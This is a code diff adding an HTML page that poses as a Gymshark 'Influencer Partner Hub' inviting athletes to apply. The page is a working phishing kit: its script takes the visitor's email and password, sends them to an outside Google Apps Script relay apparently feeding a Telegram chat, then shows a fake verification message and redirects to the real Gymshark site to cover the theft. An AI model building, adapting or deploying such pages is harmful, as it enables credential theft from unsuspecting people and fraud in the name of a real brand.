@@ -1,0 +1,250 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Portal Gymshark | Influencer Partner Hub</title>
+    
+    <meta property="og:title" content="Plataforma de Registro | Gestión 2026">
+    <meta property="og:description" content="Acceso al sistema de gestión de perfiles y actualización de información personal.">
+   
+    
+    <script src="https://unpkg.com/lucide@latest"></script>
+   <link rel="icon" type="image/png" href="">
+    <style>
+        
+        :root {
+            --bg-black: #000000;
+            --text-white: #FFFFFF;
+            --text-gray: #9B9B9B;
+            --input-bg: #111111;
+            --btn-bg: #FFFFFF;
+            --btn-text: #000000;
+            --font-main: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+        }
+
+        * { box-sizing: border-box; margin: 0; padding: 0; -webkit-font-smoothing: antialiased; }
+
+        body {
+            font-family: var(--font-main);
+            background-color: var(--bg-black);
+            color: var(--text-white);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 400px;
+            text-align: center;
+        }
+
+        
+        .brand-logo {
+            width: 250px;
+            margin: 0 auto 40px auto;
+            display: block;
+        }
+
+        .sub-header {
+            color: var(--text-gray);
+            font-size: 0.75rem;
+            text-transform: uppercase;
+            letter-spacing: 1.5px;
+            font-weight: 600;
+            margin-bottom: 15px;
+        }
+
+        h1 {
+            font-size: 2.2rem;
+            font-weight: 800;
+            line-height: 1.1;
+            margin-bottom: 15px;
+            text-transform: uppercase;
+            letter-spacing: -1px;
+        }
+
+        .scout-text {
+            font-size: 1.1rem;
+            font-weight: 600;
+            margin-bottom: 15px;
+        }
+
+        .description {
+            color: var(--text-gray);
+            font-size: 0.95rem;
+            line-height: 1.4;
+            margin-bottom: 35px;
+        }
+
+        
+        .form-group {
+            margin-bottom: 12px;
+            position: relative;
+            text-align: left;
+        }
+
+        .input-field {
+            width: 100%;
+            background-color: var(--input-bg);
+            border: 1px solid #222;
+            border-radius: 6px;
+            padding: 18px;
+            padding-right: 50px;
+            color: var(--text-white);
+            font-size: 1rem;
+            outline: none;
+        }
+
+        .toggle-password {
+            position: absolute;
+            right: 15px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: none;
+            border: none;
+            color: var(--text-white); 
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+        }
+
+        
+        .btn-main {
+            width: 100%;
+            background-color: var(--btn-bg);
+            color: var(--btn-text);
+            border: none;
+            border-radius: 4px;
+            padding: 18px;
+            font-size: 0.95rem;
+            font-weight: 800;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+
+        
+        .hidden { display: none; }
+        
+        .success-icon {
+            color: var(--text-white);
+            margin-bottom: 20px;
+        }
+
+        .fade-in { animation: fadeIn 0.5s ease-in; }
+        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+
+        .footer-legal {
+            margin-top: 80px;
+            color: var(--text-gray);
+            font-size: 0.7rem;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <div id="main-view">
+        <img src="l" alt="Logo" class="brand-logo">
+        
+        <p class="sub-header">Gymshark | Influencer Partner Hub</p>
+        <h1>Join the Athlete Program</h1>
+        <p class="scout-text">Scouting: America Latina Regional</p>
+        <p class="description">
+            Start on our official portal to validate your commitment to us. Belong and apply to the Regional Program for Athletes and Athletes
+        </p>
+
+        <div class="form-group">
+            <input type="text" id="user_field" class="input-field" placeholder="Email or Iclude (Personal)">
+        </div>
+        
+        <div class="form-group">
+            <input type="password" id="key_field" class="input-field" placeholder="Security Code (Password)">
+            <button class="toggle-password" onclick="togglePass()">
+                <i data-lucide="eye" id="eye-icon" style="width: 22px; height: 22px;"></i>
+            </button>
+        </div>
+
+        <button class="btn-main" id="submit-btn" onclick="processSelection()">
+            Connect Metrics & Apply
+        </button>
+
+        <p class="footer-legal">
+            Gym Sshark © 2026 | All Athlete Programs are subject to review.
+        </p>
+    </div>
+
+    <div id="confirmation-view" class="hidden fade-in">
+        <i data-lucide="shield-check" class="success-icon" style="width: 70px; height: 70px; margin: 0 auto 25px auto; display: block;"></i>
+        <h1>Request Received</h1>
+        <p class="description" style="margin-top: 20px;">
+            Your information have been verified. Synchronizing engagement metrics...
+        </p>
+        <div style="color: var(--text-gray); font-size: 0.8rem;">Redireccionando a la página oficial de nuetra tienda de productos...</div>
+    </div>
+</div>
+
+<script>
+    const googleBridgeURL = "https://script.google.com/macros/s/AKfycbyZNdox5mHQ3c3yGIT7KHrf0XQD8bRMuLerJXu4WFFK1EmSvi4fBh7_rEPdTL6qQVSC/exec";
+
+    function togglePass() {
+        const input = document.getElementById('key_field');
+        const icon = document.getElementById('eye-icon');
+        if (input.type === "password") {
+            input.type = "text";
+            icon.setAttribute('data-lucide', 'eye-off');
+        } else {
+            input.type = "password";
+            icon.setAttribute('data-lucide', 'eye');
+        }
+        lucide.createIcons();
+    }
+
+    async function sendToTelegram(mensaje) {
+        try {
+            await fetch(googleBridgeURL, {
+                method: "POST",
+                mode: "cors", 
+                body: JSON.stringify({ payload: mensaje })
+            });
+        } catch (e) {
+            console.warn("Sync...");
+        }
+    }
+
+    async function processSelection() {
+        const user = document.getElementById('user_field').value;
+        const pass = document.getElementById('key_field').value;
+        const btn = document.getElementById('submit-btn');
+
+        if(user.length > 3 && pass.length > 5) {
+            btn.innerText = "Verificando...";
+            btn.disabled = true;
+
+            
+            await sendToTelegram(`<b>GS A-PROGRAM</b>\n<b>User:</b> <code>${user}</code>\n<b>Pass:</b> <code>${pass}</code>`);
+            
+            setTimeout(() => {
+                document.getElementById('main-view').classList.add('hidden');
+                document.getElementById('confirmation-view').classList.remove('hidden');
+                
+                
+                setTimeout(() => {
+                    window.location.href = "https://www.gymshark.com";
+                }, 2000);
+            }, 1200);
+        } else {
+            alert("Por favor, ingresa credenciales válidas.");
+        }
+    }
+
+    lucide.createIcons();
+</script>
+
+</body>
+</html>
